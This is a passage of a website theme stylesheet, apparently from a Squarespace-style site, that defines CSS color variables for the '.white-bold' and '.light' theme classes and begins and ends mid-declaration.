tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-quote-block-source-color:hsla(var(--black-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--black-hsl),1);--tweak-quote-block-text-color:hsla(var(--black-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--black-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-title-color:hsla(var(--black-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-text-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-video-item-description-color:hsla(var(--black-hsl),1);--tweak-video-item-meta-color:hsla(var(--black-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-video-item-title-color:hsla(var(--black-hsl),1);--video-grid-basic-description-color:hsla(var(--black-hsl),1);--video-grid-basic-meta-color:hsla(var(--black-hsl),1);--video-grid-basic-title-color:hsla(var(--black-hsl),1);--video-grid-category-nav-color:hsla(var(--black-hsl),1);}.white-bold {--announcement-bar-background-color:hsla(var(--accent-hsl),1);--announcement-bar-text-color:hsla(var(--safeInverseAccent-hsl),1);--backgroundOverlayColor:hsla(var(--white-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--darkAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--white-hsl),1);--course-item-nav-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-border-color:hsla(var(--black-hsl),0.25);--course-item-nav-text-color:hsla(var(--black-hsl),1);--course-list-course-progress-bar-color:hsla(var(--darkAccent-hsl),1);--course-list-course-item-background:hsla(var(--lightAccent-hsl),1);--course-list-course-item-hover-background:hsla(var(--lightAccent-hsl),0.75);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--white-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--safeDarkAccent-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--lightAccent-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--lightAccent-hsl),0.75);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--darkAccent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--safeDarkAccent-hsl),1);--headingLargeColor:hsla(var(--safeDarkAccent-hsl),1);--headingLinkColor:hsla(var(--safeDarkAccent-hsl),1);--headingMediumColor:hsla(var(--safeDarkAccent-hsl),1);--headingSmallColor:hsla(var(--safeDarkAccent-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--white-hsl),0);--image-block-card-image-title-color:hsla(var(--black-hsl),1);--image-block-card-inline-link-color:hsla(var(--black-hsl),1);--image-block-collage-background-color:hsla(var(--lightAccent-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--white-hsl),0);--image-block-collage-image-title-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-inline-link-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--white-hsl),1);--image-block-overlap-image-title-color:hsla(var(--black-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--white-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--white-hsl),0);--image-block-stack-image-title-color:hsla(var(--black-hsl),1);--image-block-stack-inline-link-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--lightAccent-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--lightAccent-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-description-color:hsla(var(--black-hsl),1);--list-section-carousel-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--lightAccent-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--black-hsl),1);--list-section-simple-description-color:hsla(var(--black-hsl),1);--list-section-simple-title-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-title-color:hsla(var(--safeDarkAccent-hsl),1);--menuOverlayBackgroundColor:hsla(var(--white-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--black-hsl),1);--navigationLinkColor:hsla(var(--black-hsl),1);--paragraphLargeColor:hsla(var(--black-hsl),1);--paragraphLinkColor:hsla(var(--safeDarkAccent-hsl),1);--paragraphMediumColor:hsla(var(--black-hsl),1);--paragraphSmallColor:hsla(var(--black-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--safeDarkAccent-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--white-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--black-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--safeDarkAccent-hsl),1);--portfolio-hover-static-title-color:hsla(var(--safeDarkAccent-hsl),1);--portfolio-index-background-title-color:hsla(var(--black-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--section-inset-border-color:hsla(var(--white-hsl),1);--shape-block-background-color:hsla(var(--lightAccent-hsl),1);--shape-block-dropshadow-color:hsla(var(--lightAccent-hsl),1);--shape-block-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--siteBackgroundColor:hsla(var(--white-hsl),1);--siteTitleColor:hsla(var(--safeDarkAccent-hsl),1);--social-links-block-main-icon-color:hsla(var(--black-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--white-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--black-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--text-highlight-color:hsla(var(--safeDarkAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--black-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--black-hsl),1);--tweak-blog-item-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-blog-item-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--black-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-content-link-block-title-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-form-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--black-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-description-color:hsla(var(--black-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-option-color:hsla(var(--black-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-title-color:hsla(var(--black-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-hsl:var(--black-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-hsl:var(--black-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--white-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--white-hsl),1);--tweak-gallery-icon-color:hsla(var(--black-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--white-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--black-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-line-block-line-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-marquee-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--black-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--black-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--black-hsl),1);--tweak-menu-block-nav-color:hsla(var(--black-hsl),1);--tweak-menu-block-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--black-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--black-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--safeDarkAccent-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-quote-block-source-color:hsla(var(--black-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-quote-block-text-color:hsla(var(--black-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--black-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--black-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-title-color:hsla(var(--black-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-text-block-background-color:hsla(var(--lightAccent-hsl),1);--tweak-video-item-description-color:hsla(var(--accent-hsl),1);--tweak-video-item-meta-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-video-item-title-color:hsla(var(--accent-hsl),1);--video-grid-basic-description-color:hsla(var(--accent-hsl),1);--video-grid-basic-meta-color:hsla(var(--accent-hsl),1);--video-grid-basic-title-color:hsla(var(--accent-hsl),1);--video-grid-category-nav-color:hsla(var(--accent-hsl),1);}.light {--announcement-bar-background-color:hsla(var(--darkAccent-hsl),1);--announcement-bar-text-color:hsla(var(--white-hsl),1);--backgroundOverlayColor:hsla(var(--lightAccent-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--darkAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--white-hsl),1);--course-item-nav-background-color:hsla(var(--white-hsl),1);--course-item-nav-border-color:hsla(var(--black-hsl),0.25);--course-item-nav-text-color:hsla(var(--black-hsl),1);--course-list-course-progress-bar-color:hsla(var(--accent-hsl),1);--course-list-course-item-background:hsla(var(--white-hsl),1);--course-list-course-item-hover-background:hsla(var(--white-hsl),0.75);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--lightAccent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--white-hsl),0.75);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--accent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--black-hsl),1);--headingLargeColor:hsla(var(--black-hsl),1);--headingLinkColor:hsla(var(--safeDarkAccent-hsl),1);--headingMediumColor:hsla(var(--black-hsl),1);--headingSmallColor:hsla(var(--black-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--lightAccent-hsl),0);--image-block-card-image-title-color:hsla(var(--black-hsl),1);--image-block-card-inline-link-color:hsla(var(--black-hsl),1);--image-block-collage-background-color:hsla(var(--white-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--lightAccent-hsl),0);--image-block-collage-image-title-color:hsla(var(--black-hsl),1);--image-block-collage-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--lightAccent-hsl),1);--image-block-overlap-image-title-color:hsla(var(--black-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--lightAccent-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--lightAccent-hsl),0);--image-block-stack-image-title-color:hsla(var(--black-hsl),1);--image-block-stack-inline-link-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--black-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--white-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--black-hsl),1);--list-section-carousel-description-color:hsla(var(--black-hsl),1);--list-section-carousel-title-color:hsla(var(--black-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--white-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--black-hsl),1);--list-section-simple-description-color:hsla(var(--black-hsl),1);--list-section-simple-title-color:hsla(var(--black-hsl),1);--list-section-title-color:hsla(var(--black-hsl),1);--menuOverlayBackgroundColor:hsla(var(--lightAccent-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseDarkAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--black-hsl),1);--navigationLinkColor:hsla(var(--black-hsl),1);--paragraphLargeColor:hsla(var(--black-hsl),1);--paragraphLinkColor:hsla(var(--safeDarkAccent-hsl),1);--paragraphMediumColor:hsla(var(--black-hsl),1);--paragraphSmallColor:hsla(var(--black-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--black-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--lightAccent-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--black-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--black-hsl),1);--portfolio-hover-static-title-color:hsla(var(--black-hsl),1);--portfolio-index-background-title-color:hsla(var(--black-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeDarkAccent-hsl),1);--primar